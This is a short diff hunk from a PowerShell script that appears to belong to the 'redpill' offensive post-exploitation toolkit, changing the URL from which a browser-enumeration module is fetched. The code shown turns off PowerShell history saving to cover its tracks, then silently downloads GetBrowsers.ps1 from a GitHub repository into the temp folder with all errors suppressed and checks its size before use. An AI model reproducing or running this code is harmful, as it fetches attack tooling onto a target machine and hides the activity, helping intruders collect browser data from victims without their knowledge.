@@ -39,7 +39,7 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
     If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
-        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
+        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
         ## Check downloaded file integrity => FileSizeKBytes
         $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 58){## Corrupted download detected => DefaultFileSize: 58,1435546875/KB
